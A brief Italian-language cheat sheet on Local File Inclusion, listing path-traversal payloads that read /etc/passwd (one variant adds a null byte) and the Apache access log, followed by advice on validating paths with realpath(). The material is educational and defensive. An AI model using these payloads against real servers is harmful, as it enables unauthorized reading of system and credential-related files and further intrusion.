# LFI (Local File Inclusion)

### **Obiettivo**
Leggere file interni del server.

### **Payload di Base**

- **Accesso a /etc/passwd:**
    ```text
  ?page=../../../../etc/passwd
  ?page=../../../../etc/passwd%00
    ```

- **Accesso a file di log:**
    ```text
  ?page=../../../../var/log/apache2/access.log
    ```

### **Mitigazione**
- Valida rigorosamente i percorsi forniti dall'utente.
- Usa funzioni come `realpath()` per verificare che il file sia in una directory consentita.
